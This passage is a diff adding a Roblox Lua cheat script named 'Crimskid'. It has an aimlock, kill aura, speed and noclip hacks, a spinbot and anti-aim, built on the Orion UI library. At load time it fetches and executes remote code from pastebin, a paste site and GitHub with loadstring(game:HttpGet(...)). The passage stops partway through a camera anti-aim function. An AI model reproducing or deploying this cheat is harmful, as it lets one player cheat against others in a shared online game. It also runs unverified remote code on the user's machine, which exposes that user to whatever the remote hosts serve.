@@ -1,0 +1,3139 @@
+local NotifyLibrary = loadstring(game:HttpGet("https://pastebin.com/raw/zg2UfGDN"))()
+local Notify = NotifyLibrary.Notify
+
+
+--[[
+███████╗███████╗███████╗███╗   ██╗ ██████╗ ██████╗ ███████╗ ██╗ ██╗  ██████╗ ███████╗███████╗ █████╗ 
+██╔════╝██╔════╝██╔════╝████╗  ██║██╔═══██╗██╔══██╗██╔════╝████████╗██╔════╝ ██╔════╝██╔════╝██╔══██╗
+█████╗  █████╗  █████╗  ██╔██╗ ██║██║   ██║██████╔╝█████╗  ╚██╔═██╔╝███████╗ ███████╗███████╗╚██████║
+██╔══╝  ██╔══╝  ██╔══╝  ██║╚██╗██║██║   ██║██╔══██╗██╔══╝  ████████╗██╔═══██╗╚════██║╚════██║ ╚═══██║
+██║     ███████╗███████╗██║ ╚████║╚██████╔╝██████╔╝███████╗╚██╔═██╔╝╚██████╔╝███████║███████║ █████╔╝
+╚═╝     ╚══════╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚══════╝ ╚═╝ ╚═╝  ╚═════╝ ╚══════╝╚══════╝ ╚════╝ 
+]]
+
+
+getgenv().AimlockEnabled = false 
+getgenv().Resolverr = false
+getgenv().Part = "UpperTorso"
+getgenv().Pred = 0.12
+local IsLocking = false
+getgenv().Airshot = true 
+getgenv().DropdownPart = "UpperTorso"
+
+        local CC = game:GetService"Workspace".CurrentCamera
+        local LocalMouse = game.Players.LocalPlayer:GetMouse()
+        
+        
+        function cockandballtorture()
+            local closestPlayer
+            local shortestDistance = math.huge
+ 
+            for i, v in pairs(game.Players:GetPlayers()) do
+                if v ~= game.Players.LocalPlayer and v.Character and v.Character:FindFirstChild("Humanoid") and v.Character.Humanoid.Health ~= 0 and v.Character:FindFirstChild("LowerTorso") then
+                    local pos = CC:WorldToViewportPoint(v.Character.PrimaryPart.Position)
+                    local magnitude = (Vector2.new(pos.X, pos.Y) - Vector2.new(LocalMouse.X, LocalMouse.Y)).magnitude
+                    if magnitude < shortestDistance then
+                        closestPlayer = v
+                        shortestDistance = magnitude
+                    end
+                end
+            end
+            return closestPlayer
+        end
+        
+
+game:GetService("UserInputService").InputBegan:Connect(function(inp)
+if inp.UserInputType == Enum.UserInputType.MouseButton2 then
+aim = true
+        lol =  cockandballtorture()
+end
+
+
+
+end) 
+
+game:GetService("UserInputService").InputEnded:Connect(function(inp)
+if inp.UserInputType == Enum.UserInputType.MouseButton2 then
+aim = false
+end
+end)
+
+game:GetService("RunService").heartbeat:Connect(function()
+if Plr.Character.Humanoid.Jump == true and Plr.Character.Humanoid.FloorMaterial == Enum.Material.Air and getgenv().Airshot == true  then
+                getgenv().Part = "RightFoot"
+else
+                    getgenv().Part = getgenv().DropdownPart
+end 
+end)
+
+
+game:GetService("RunService").heartbeat:Connect(function()
+                       
+
+if aim then
+    if getgenv().Resolverr == false and getgenv().AimlockEnabled == true 
+ then 
+game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, lol.Character[getgenv().Part].Position + (lol.Character[getgenv().Part].Velocity*getgenv().Pred))
+end 
+
+if getgenv().Resolverr == true and getgenv().AimlockEnabled == true then
+    game.Workspace.CurrentCamera.CFrame = CFrame.new(game.Workspace.CurrentCamera.CFrame.Position, lol.Character[getgenv().Part].Position)
+end 
+end 
+end)
+
+local AnimationModule = {
+        Astronaut = {
+            "rbxassetid://891621366",
+            "rbxassetid://891633237",
+            "rbxassetid://891667138",
+            "rbxassetid://891636393",
+            "rbxassetid://891627522",
+            "rbxassetid://891609353",
+            "rbxassetid://891617961"
+        },
+        Bubbly = {
+            "rbxassetid://910004836",
+            "rbxassetid://910009958",
+            "rbxassetid://910034870",
+            "rbxassetid://910025107",
+            "rbxassetid://910016857",
+            "rbxassetid://910001910",
+            "rbxassetid://910030921",
+            "rbxassetid://910028158"
+        },
+        Cartoony = {
+            "rbxassetid://742637544",
+            "rbxassetid://742638445",
+            "rbxassetid://742640026",
+            "rbxassetid://742638842",
+            "rbxassetid://742637942",
+            "rbxassetid://742636889",
+            "rbxassetid://742637151"
+        },
+        Confindent = {
+            "rbxassetid://1069977950",
+            "rbxassetid://1069987858",
+            "rbxassetid://1070017263",
+            "rbxassetid://1070001516",
+            "rbxassetid://1069984524",
+            "rbxassetid://1069946257",
+            "rbxassetid://1069973677"
+        },
+        Cowboy = {
+            "rbxassetid://1014390418",
+            "rbxassetid://1014398616",
+            "rbxassetid://1014421541",
+            "rbxassetid://1014401683",
+            "rbxassetid://1014394726",
+            "rbxassetid://1014380606",
+            "rbxassetid://1014384571"
+        },
+        Default = {
+            "http://www.roblox.com/asset/?id=507766666",
+            "http://www.roblox.com/asset/?id=507766951",
+            "http://www.roblox.com/asset/?id=507777826",
+            "http://www.roblox.com/asset/?id=507767714",
+            "http://www.roblox.com/asset/?id=507765000",
+            "http://www.roblox.com/asset/?id=507765644",
+            "http://www.roblox.com/asset/?id=507767968"
+        },
+        Elder = {
+            "rbxassetid://845397899",
+            "rbxassetid://845400520",
+            "rbxassetid://845403856",
+            "rbxassetid://845386501",
+            "rbxassetid://845398858",
+            "rbxassetid://845392038",
+            "rbxassetid://845396048" 
+        },
+        Ghost = {
+            "rbxassetid://616006778",
+            "rbxassetid://616008087",
+            "rbxassetid://616013216",
+            "rbxassetid://616013216",
+            "rbxassetid://616008936",
+            "rbxassetid://616005863",
+            "rbxassetid://616012453",
+            "rbxassetid://616011509"
+        },
+        Knight = {
+            "rbxassetid://657595757",
+            "rbxassetid://657568135",
+            "rbxassetid://657552124",
+            "rbxassetid://657564596",
+            "rbxassetid://658409194",
+            "rbxassetid://658360781",
+            "rbxassetid://657600338"
+        },
+        Levitation = {
+            "rbxassetid://616006778",
+            "rbxassetid://616008087",
+            "rbxassetid://616013216",
+            "rbxassetid://616010382",
+            "rbxassetid://616008936",
+            "rbxassetid://616003713",
+            "rbxassetid://616005863"
+        },
+        Mage = {
+            "rbxassetid://707742142",
+            "rbxassetid://707855907",
+            "rbxassetid://707897309",
+            "rbxassetid://707861613",
+            "rbxassetid://707853694",
+            "rbxassetid://707826056",
+            "rbxassetid://707829716"
+        },
+        Ninja = {
+            "rbxassetid://656117400",
+            "rbxassetid://656118341",
+            "rbxassetid://656121766",
+            "rbxassetid://656118852",
+            "rbxassetid://656117878",
+            "rbxassetid://656114359",
+            "rbxassetid://656115606"
+        },
+        OldSchool = {
+            "rbxassetid://5319828216",
+            "rbxassetid://5319831086",
+            "rbxassetid://5319847204",
+            "rbxassetid://5319844329",
+            "rbxassetid://5319841935",
+            "rbxassetid://5319839762",
+            "rbxassetid://5319852613",
+            "rbxassetid://5319850266"
+        },
+        Patrol = {
+            "rbxassetid://1149612882",
+            "rbxassetid://1150842221",
+            "rbxassetid://1151231493",
+            "rbxassetid://1150967949",
+            "rbxassetid://1148811837",
+            "rbxassetid://1148811837",
+            "rbxassetid://1148863382"
+        },
+        Pirtate = {
+            "rbxassetid://750781874",
+            "rbxassetid://750782770",
+            "rbxassetid://750785693",
+            "rbxassetid://750783738",
+            "rbxassetid://750782230",
+            "rbxassetid://750779899",
+            "rbxassetid://750780242"
+        },
+        Popstar = {
+            "rbxassetid://1212900985",
+            "rbxassetid://1150842221",
+            "rbxassetid://1212980338",
+            "rbxassetid://1212980348",
+            "rbxassetid://1212954642",
+            "rbxassetid://1213044953",
+            "rbxassetid://1212900995"
+        },
+        Princess = {
+            "rbxassetid://941003647",
+            "rbxassetid://941013098",
+            "rbxassetid://941028902",
+            "rbxassetid://941015281",
+            "rbxassetid://941008832",
+            "rbxassetid://940996062",
+            "rbxassetid://941000007"
+        },
+        Robot = {
+            "rbxassetid://616088211",
+            "rbxassetid://616089559",
+            "rbxassetid://616095330",
+            "rbxassetid://616091570",
+            "rbxassetid://616090535",
+            "rbxassetid://616086039",
+            "rbxassetid://616087089"
+        },
+        Rthro = {
+            "rbxassetid://2510196951",
+            "rbxassetid://2510197257",
+            "rbxassetid://2510202577",
+            "rbxassetid://2510198475",
+            "rbxassetid://2510197830",
+            "rbxassetid://2510195892",
+            "rbxassetid://02510201162",
+            "rbxassetid://2510199791",
+            "rbxassetid://2510192778"
+        },
+        Sneaky = {
+            "rbxassetid://1132473842",
+            "rbxassetid://1132477671",
+            "rbxassetid://1132510133",
+            "rbxassetid://1132494274",
+            "rbxassetid://1132489853",
+            "rbxassetid://1132461372",
+            "rbxassetid://1132469004"
+        },
+        Stylish = {
+            "rbxassetid://616136790",
+            "rbxassetid://616138447",
+            "rbxassetid://616146177",
+            "rbxassetid://616140816",
+            "rbxassetid://616139451",
+            "rbxassetid://616133594",
+            "rbxassetid://616134815"
+        },
+        Superhero = {
+            "rbxassetid://782841498",
+            "rbxassetid://782845736",
+            "rbxassetid://782843345",
+            "rbxassetid://782842708",
+            "rbxassetid://782847020",
+            "rbxassetid://782843869",
+            "rbxassetid://782846423"
+        },
+        Toy = {
+            "rbxassetid://782841498",
+            "rbxassetid://782845736",
+            "rbxassetid://782843345",
+            "rbxassetid://782842708",
+            "rbxassetid://782847020",
+            "rbxassetid://782843869",
+            "rbxassetid://782846423"
+        },
+        Vampire = {
+            "rbxassetid://1083445855",
+            "rbxassetid://1083450166",
+            "rbxassetid://1083473930",
+            "rbxassetid://1083462077",
+            "rbxassetid://1083455352",
+            "rbxassetid://1083439238",
+            "rbxassetid://1083443587"
+        },
+        Werewolf = {
+            "rbxassetid://1083195517",
+            "rbxassetid://1083214717",
+            "rbxassetid://1083178339",
+            "rbxassetid://1083216690",
+            "rbxassetid://1083218792",
+            "rbxassetid://1083182000",
+            "rbxassetid://1083189019"
+        },
+        Zombie = {
+            "rbxassetid://616158929",
+            "rbxassetid://616160636",
+            "rbxassetid://616168032",
+            "rbxassetid://616163682",
+            "rbxassetid://616161997",
+            "rbxassetid://616156119",
+            "rbxassetid://616157476"
+        }
+    }
+    
+    local AnimationsName = {
+        "Astronaut",
+        "Bubbly",
+        "Cartoony",
+        "Confindent",
+        "Cowboy",
+        "Default",
+        "Elder",
+        "Ghost",
+        "Knight",
+        "Levitation",
+        "Mage",
+        "Ninja",
+        "OldSchool",
+        "Patrol",
+        "Pirate",
+        "Popstar",
+        "Princess",
+        "Robot",
+        "Rthro",
+        'Sneaky',
+        "Stylish",
+        "Superhero",
+        "Toy",
+        "Vampire",
+        "Werewolf",
+        "Zombie"
+    }
+    
+    local AnimationState = {
+        Idle = "Default",
+        Walk = "Default",
+        Run = "Default",
+        Jump = "Default",
+        Climb = "Default",
+        Fall = "Default",
+    }
+    
+
+
+
+local esp = loadstring(game:HttpGet(('https://pst.klgrth.io/paste/35xy3/raw')))()
+esp:init()
+
+local MoonGod = loadstring(game:HttpGet("https://raw.githubusercontent.com/fortniteisveryepic/back-ups/finobe/moon%20god%20notif%20lib"))()
+
+
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+
+
+
+
+local Window = OrionLib:MakeWindow({Name = "Crimskid", HidePremium = true, SaveConfig = false, IntroText = "crimskid",IntroIcon = "rbxthumb://6034509987", ConfigFolder = "Crimskid premium"})
+
+
+local IMPORTANT = Window:MakeTab({
+	Name = "IMPORTANT",
+	Icon = "rbxassetid://6031071056",
+	PremiumOnly = false
+})
+
+
+
+local Movement = Window:MakeTab({
+	Name = "Movement",
+	Icon = "rbxassetid://6034754445",
+	PremiumOnly = false
+})
+
+
+
+local AntiAims = Window:MakeTab({
+	Name = "Anti Aims",
+	Icon = "rbxassetid://6035047387",
+	PremiumOnly = false
+})
+
+local Aiming = Window:MakeTab({
+	Name = "Rage",
+	Icon = "rbxassetid://6034989550",
+	PremiumOnly = false
+})
+
+
+local Visuals = Window:MakeTab({
+	Name = "Visuals",
+	Icon = "rbxassetid://6031763426",
+	PremiumOnly = false
+})
+
+local Animations = Window:MakeTab({
+	Name = "Animations",
+	Icon = "rbxassetid://6034754445",
+	PremiumOnly = false
+})
+
+
+
+local Misc = Window:MakeTab({
+	Name = "Misc",
+	Icon = "rbxassetid://6031097229",
+	PremiumOnly = false
+})
+
+
+
+
+
+local ScriptVersion = game:HttpGet("https://raw.githubusercontent.com/f1nobe7650/paid/main/version")
+
+
+OrionLib:MakeNotification({
+	Name = "Crimskid",
+	Content = "Loaded! Version: ".. ScriptVersion .."!",
+	Image = "https://www.roblox.com/Item.aspx?avid=7300477598",
+	Time = 5
+})       
+
+
+
+
+
+    
+
+--[[
+
+while toggles.CFrameSpeed == true do 
+        task.wait() 
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getfenv().Speed
+            
+            
+        end
+
+
+]]
+
+Movement:AddToggle({
+	Name = "CFrame Speed",
+	Save = true,
+	Callback = function(a)
+	    CFrameSpeed = a 
+	    
+	    while CFrameSpeed == true do 
+        task.wait() 
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getfenv().Speed
+            
+            
+        end
+end})
+	
+
+Movement:AddToggle({
+	Name = "Fake Macro",
+	Save = true,
+	Callback = function(a)
+getgenv().FakeMacro = a 
+
+while getgenv().FakeMacro == true do 
+    task.wait()
+    getgenv().FakeMacroTurnWait = math.random(1,5)
+    if CFrameSpeed == true then 
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(90),0)
+        task.wait(0.05)
+         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(-90),0)
+          task.wait(0.05)
+                   game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(-90),0)
+          task.wait(0.05)
+                             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(90),0)
+          task.wait(0.05)
+    end 
+end 
+end}) 
+
+
+Movement:AddBind({
+	Name = "Bind",
+	Default = "",
+	Hold = false,
+	Callback = function()
+                            
+                            
+
+
+
+		CFrameSpeed = not CFrameSpeed
+		
+ 		if CFrameSpeed == true then 
+ 		    		    		             Notify({
+                Title = "Crimskid",
+                Description = "Speed Turned On",
+                Duration = 3
+            })
+        elseif CFrameSpeed == false then 
+ 		    		    		             Notify({
+                Title = "Crimskid",
+                Description = "Speed Turned Off",
+                Duration = 3
+            }) 
+ 		end
+	 
+	 
+		while CFrameSpeed do 
+    task.wait()
+    
+        if CFrameSpeed == true then 
+            
+        
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame + game.Players.LocalPlayer.Character.Humanoid.MoveDirection * getfenv().Speed
+ 
+
+        end 
+end 
+
+
+
+	end    
+})
+
+
+
+    local chromaColor
+    spawn(function()
+        while wait() do
+            chromaColor = Color3.fromHSV(tick() % 6 / 6, 1, 1)
+        end
+    end)
+
+Movement:AddSlider({
+	Name = "Speed",
+	Min = 0,
+	Max = 100,
+	Default = 30,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		getfenv().Speed = Value/30
+				getfenv().SpeedKeybind = Value/300
+
+	end    
+})
+
+_G.JumpHeight = 60;
+Movement:AddToggle({
+	Name = "Infinite Jump",
+	Callback = function(v)
+local Player = game:GetService'Players'.LocalPlayer;
+local UIS = game:GetService'UserInputService';
+
+     _G.infinitejump = v
+    function Action(Object, Function) if Object ~= nil then Function(Object); end end
+
+    UIS.InputBegan:connect(function(UserInput)
+        if UserInput.UserInputType == Enum.UserInputType.Keyboard and UserInput.KeyCode == Enum.KeyCode.Space and _G.infinitejump == true  then
+            Action(Player.Character.Humanoid, function(self)
+                if self:GetState() == Enum.HumanoidStateType.Jumping or self:GetState() == Enum.HumanoidStateType.Freefall then
+                    Action(self.Parent.HumanoidRootPart, function(self)
+                        self.Velocity = Vector3.new(0, _G.JumpHeight, 0);
+                    end)
+                end
+            end)
+        end
+    end)
+  	end    
+})
+
+Movement:AddToggle({
+	Name = "Noclip",
+	Callback = function(v)
+	     _G.nocliptoggle = v   
+    
+        while _G.nocliptoggle == true do 
+            wait()
+        game:GetService("Players").LocalPlayer.Character.Head.Touched:connect(function(obj)
+        if obj ~= workspace.Terrain and _G.nocliptoggle == true  then 
+        obj.CanCollide = false
+        wait(30)
+        obj.CanCollide = true
+        end
+        end) 
+    end
+    
+end}) 
+
+Movement:AddBind({
+	Name = "Noclip Bind",
+	Default = "",
+	Hold = false,
+	Callback = function()
+
+	    
+ poopnoclip = not poopnoclip   
+    
+    	    	if poopnoclip == true then 
+ 		    		    		             Notify({
+                Title = "Crimskid",
+                Description = "Noclip Turned On",
+                Duration = 3
+            })
+        elseif poopnoclip == false then 
+ 		    		    		             Notify({
+                Title = "Crimskid",
+                Description = "Noclip Turned Off",
+                Duration = 3
+            }) 
+        end
+ 	
+ 	
+        while poopnoclip == true do 
+            wait()
+        game:GetService("Players").LocalPlayer.Character.Head.Touched:connect(function(obj)
+        if obj ~= workspace.Terrain and poopnoclip == true  then 
+        obj.CanCollide = false
+        wait(30)
+        obj.CanCollide = true
+        end
+        end) 
+    end
+    
+end}) 
+
+Movement:AddSlider({
+	Name = "Power",
+	Min = 0,
+	Max = 500,
+	Default = 60,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+	    _G.JumpHeight = Value;
+
+	end    
+})
+
+
+
+
+getfenv().SpinBotSpeed = 100 
+Movement:AddToggle({
+	Name = "Spin Bot",
+	Callback = function(v)
+SpinBotToggle = v
+    
+        if SpinBotToggle == true then
+            
+        repeat
+               game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(getfenv().SpinBotSpeed), 0)  
+                              game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false          
+
+            task.wait() 
+        until SpinBotToggle == false
+                if SpinBotToggle == false then
+                                                  game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true          
+
+end 
+        end
+  	end    
+})
+
+Movement:AddSlider({
+	Name = "Speed",
+	Min = 0,
+	Max = 500,
+	Default = 100,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		getfenv().SpinBotSpeed = Value*1.134
+	end    
+})
+
+_G.pwangle = 360 
+Movement:AddToggle({
+	Name = "JitterBot",
+	Default = false,
+	Callback = function(v)
+
+   _G.jitteraa = v
+
+
+if _G.jitteraa == true then 
+    game.Players.LocalPlayer.Character.Humanoid.AutoRotate = false 
+end 
+
+if _G.jitteraa == false then 
+    game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true 
+end 
+
+while _G.jitteraa == true do 
+task.wait()
+local RandomJit =  math.random(30, 90)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.Position) * CFrame.Angles(0, math.rad(_G.pwangle) + math.rad((math.random(1, 2) == 1 and RandomJit or -RandomJit)), 0) 
+end
+
+
+end}) 
+
+Movement:AddSlider({
+	Name = "Jitter Angle",
+	Min = 0,
+	Max = 360,
+	Default = 360,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		_G.pwangle = Value
+	end    
+})
+
+
+_G.floatheight = 20 
+Movement:AddToggle({
+	Name = "Float",
+	Callback = function(v)
+FloatToggle = v
+    
+
+
+while FloatToggle == true do 
+    task.wait()
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,_G.floatheight,0)
+    wait()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame =  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-_G.floatheight,0)
+end 
+
+  	end    
+})
+
+
+Movement:AddSlider({
+	Name = "Height",
+	Min = 0,
+	Max = 500,
+	Default = 20,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+		_G.floatheight = Value
+	end    
+})
+
+Movement:AddToggle({
+	Name = "Anti Stomp",
+	Callback = function(v)
+
+_G.antistomptoggle = v
+
+game:GetService("RunService").RenderStepped:Connect(function() 
+    
+local FF  = game.Players.LocalPlayer.Character:FindFirstChild("ForceField")
+
+if game.Players.LocalPlayer.Character.Humanoid.Health <= 5 and _G.antistomptoggle == true and not FF then 
+
+
+						wait(1)	
+						game.Players.LocalPlayer.Character.RagdollConstraints:Destroy()
+						game.Players.LocalPlayer.Character.Head.NeckRigAttachment:Destroy()
+						game.Players.LocalPlayer.Character.Head.Neck:Destroy()
+						wait(0.5)
+                        game.Players.LocalPlayer.Character.Head:Destroy()
+						game.Players.LocalPlayer.Character.LowerTorso:Destroy()
+						game.Players.LocalPlayer.Character.UpperTorso:Destroy()
+						wait(.2)
+						game.Players.LocalPlayer.Character.LeftHand:Destroy()
+
+						game.Players.LocalPlayer.Character.LeftLowerLeg:Destroy()
+
+						game.Players.LocalPlayer.Character.LeftFoot:Destroy()
+						game.Players.LocalPlayer.Character.RightLowerArm:Destroy()
+						game.Players.LocalPlayer.Character.LeftUpperLeg:Destroy()
+						game.Players.LocalPlayer.Character.RightFoot:Destroy()
+						game.Players.LocalPlayer.Character.RightLowerLeg:Destroy()
+						game.Players.LocalPlayer.Character.RightUpperLeg:Destroy()
+						game.Players.LocalPlayer.Character.RightHand:Destroy()
+						game.Players.LocalPlayer.Character.LeftLowerArm:Destroy()
+						game.Players.LocalPlayer.Character.LeftUpperArm:Destroy()
+						game.Players.LocalPlayer.Character.RightUpperArm:Destroy()
+						game.Players.LocalPlayer.Character.Head:Destroy()
+					
+
+end
+ 
+end)
+
+		 
+
+
+
+
+  	end    
+})
+
+local TargetAim = Aiming:AddSection({
+	Name = "Target Aim"
+})
+
+TargetAim:AddToggle({
+	Name = "Enabled",
+	Default = false,
+	Callback = function(v)
+    getgenv().Target = v
+
+
+end})
+
+
+
+
+TargetAim:AddToggle({
+	Name = "Velocity Resolver",
+	Default = false,
+	Callback = function(v)
+	    getgenv().resolver = v 
+end}) 
+
+TargetAim:AddToggle({
+	Name = "Part Visible",
+	Default = true,
+	Callback = function(v)
+    
+    if v == true then
+    _G.targetaimtransparency  = 0.8
+    end 
+    
+    if v == false then 
+        _G.targetaimtransparency  = 1
+    end 
+
+
+end}) 
+
+
+
+TargetAim:AddToggle({
+	Name = "Rainbow",
+	Default = false,
+	Callback = function(v)
+    _G.rainbow  = v 
+    
+    while _G.rainbow == true do 
+        task.wait()
+     _G.targetaimcolor = chromaColor 
+    end 
+
+    
+    if _G.rainbow == false then 
+     _G.targetaimcolor = Color3.fromRGB(255,255,255) 
+    end 
+
+end}) 
+
+
+TargetAim:AddToggle({
+	Name = "Notifications",
+	Default = true,
+	Callback = function(v)
+	    getgenv().NotifMode = v
+
+end}) 
+
+TargetAim:AddSlider({
+	Name = "Part Size",
+	Min = 0,
+	Max = 100,
+	Default = 8,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "sz",
+	Callback = function(v)
+		_G.targetaimsize = Vector3.new(v,v,v)
+	end    
+})
+
+
+
+TargetAim:AddSlider({
+	Name = "Part Transparency",
+	Min = 0,
+	Max = 10,
+	Default = 8,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	ValueName = "sz",
+	Callback = function(v)
+		_G.targetaimtransparency = v/10
+	end    
+})
+
+
+TargetAim:AddColorpicker({
+	Name = "Part Colour",
+	Default = Color3.fromRGB(255, 255, 255),
+	Callback = function(Value)
+		         _G.targetaimcolor = Value
+	end	  
+})
+
+ 
+
+
+TargetAim:AddToggle({
+	Name = "LookAt",
+	Save = true,
+	Callback = function(a)
+getgenv().Lookat = a 
+end}) 
+
+TargetAim:AddToggle({
+	Name = "Chat Mode",
+	Save = true,
+	Callback = function(a)
+getgenv().ChatMode = a 
+end}) 
+
+TargetAim:AddSlider({
+	Name = "Transparency",
+	Min = 0,
+	Max = 10,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,0),
+	Increment = 1,
+	ValueName = "ts",
+	Callback = function(v)
+		_G.fillTransparency = v/10
+	end    
+})
+
+TargetAim:AddTextbox({
+	Name = "Keybind",
+	Default = "V",
+	TextDisappear = false,
+	Callback = function(Value)
+		getgenv().Key = Enum.KeyCode[string.upper(Value)]
+		    		             Notify({
+                Title = "Crimskid",
+                Description = "Make sure the keybind is a capital :" .. string.upper(Value) .."",
+                Duration = 3
+            })
+	end	  
+})
+
+TargetAim:AddTextbox({
+	Name = "Prediction",
+	Default = "0.1413",
+	TextDisappear = false,
+	Callback = function(Value)
+		getgenv().Prediction = Value  
+		             Notify({
+                Title = "Crimskid",
+                Description = "Set Prediction To: " .. getgenv().Prediction .. "",
+                Duration = 3
+            })
+	end	  
+})
+local TargetStrafe = Aiming:AddSection({
+	Name = "Target Strafe"
+})
+
+TargetStrafe:AddToggle({
+	Name = "Enable",
+	Default = false,
+	Callback = function(v)
+getgenv().TargetStrafe = v 
+end}) 
+
+
+
+
+
+
+TargetStrafe:AddSlider({
+	Name = "Distance",
+	Min = 0,
+	Max = 20,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+    getgenv().targetdistance = Value
+
+	end    
+})
+
+TargetStrafe:AddSlider({
+	Name = "Speed",
+	Min = 0,
+	Max = 100,
+	Default = 5,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(Value)
+getgenv().targetspeed = Value  
+
+	end    
+})
+
+
+local Aimlock = Aiming:AddSection({
+	Name = "CamLock"
+})
+
+Aimlock:AddToggle({
+	Name = "Enable",
+	Default = false,
+	Callback = function(v)
+getgenv().AimlockEnabled = v 
+end}) 
+
+Aimlock:AddToggle({
+	Name = "Resolver",
+	Default = false,
+	Callback = function(v)
+getgenv().Resolverr = v 
+end}) 
+
+Aimlock:AddToggle({
+	Name = "Airshot Function",
+	Default = false,
+	Callback = function(v)
+getgenv().Airshot = v 
+end}) 
+
+Aimlock:AddTextbox({
+	Name = "Prediction",
+	Default = "0.12",
+	TextDisappear = false,
+	Callback = function(Value)
+getgenv().Pred = Value
+
+ Notify({
+                Title = "Crimskid",
+                Description = "Set Prediction To: " .. getgenv().Pred .. "",
+                Duration = 3
+            })
+
+end}) 
+
+
+Aimlock:AddDropdown({
+	Name = "BodyPart",
+	Default = "1",
+	Options = {
+    "UpperTorso",
+    "Head",
+    "HumanoidRootPart",
+	},
+	Callback = function(v)
+	    getgenv().DropdownPart = v 
+	    
+end}) 
+
+
+local KillAura = Aiming:AddSection({
+	Name = "Kill Aura"
+})
+
+
+
+KillAura:AddToggle({
+	Name = "Enable",
+	Default = false,
+	Callback = function(v)
+   _G.bot = v
+        local Radius = 35
+        local lplr = game:GetService("Players").LocalPlayer
+        
+         
+        game:GetService("RunService").RenderStepped:Connect(function()
+        if _G.bot == true then 
+        for _,q in pairs (game:GetService("Players"):GetPlayers()) do 
+            if q  ~= lplr then
+                local Magnitude = (lplr.Character.HumanoidRootPart.Position - q.Character.HumanoidRootPart.Position).Magnitude
+                if Radius > Magnitude then 
+                    if game.Players[q.Name].Information.KO.Value == false  then 
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players[q.Name].Character.HumanoidRootPart.CFrame * CFrame.new(_G.sideways ,_G.up ,_G.distance)
+               end 
+          end
+        end
+     
+        end
+        end 
+         end) 
+end}) 
+
+KillAura:AddSlider({
+	Name = "X Offset",
+	Min = -30,
+	Max = 30,
+	Default = 2,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(a)
+	    _G.distance = a 
+end}) 
+
+KillAura:AddSlider({
+	Name = "Y Offset",
+	Min = -30,
+	Max = 30,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(a)
+	    _G.sideways = a 
+end}) 
+
+KillAura:AddSlider({
+	Name = "Z Offset",
+	Min = -30,
+	Max = 30,
+	Default = 0,
+	Color = Color3.fromRGB(255,255,255),
+	Increment = 1,
+	Callback = function(a)
+	    _G.up = a 
+end}) 
+
+
+
+
+
+
+
+
+-- Settings
+
+AntiAims:AddToggle({
+	Name = "Camera",
+	Default = false,
+	Callback = function(v)
+
+getgenv().CameraToggleeee = v
+--// Variables
+local plrs = game:GetService("Players")
+   local ts = game:GetService("TweenService")
+   local rs = game:GetService("RunService")
+   local ws = game:GetService("Workspace")
+   
+   --// LocalPlayer
+   local plr = plrs.LocalPlayer
+   
+   --//Making Camera
+   local Camera = Instance.new("Part", ws)
+       Camera.CanCollide = false
+       Camera.Color = Color3.fromRGB(0, 0, 0)
+       Camera.Size = Vector3.new(0.1, 0.1, 0.1)
+       Camera.Anchored = true
+       Camera.Transparency = 1
+       Camera.Position = (plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")) and plr.Character:FindFirstChild("HumanoidRootPart").Position or Vector3.new(0, 0, 0)
+       
+       --//Setting the Camera
+       ws.CurrentCamera.CameraSubject = Camera
+       
+       --//Fast Loop
+       rs.RenderStepped:Connect(function()
+           
+           --//Fast Wait
+           rs.RenderStepped:Wait()
+           
+           --//Other Variables
+           local chr = plr.Character
+                   local hrp = chr:FindFirstChild("Head")
+                   local OldPos
+                   
+                   --//Check If On
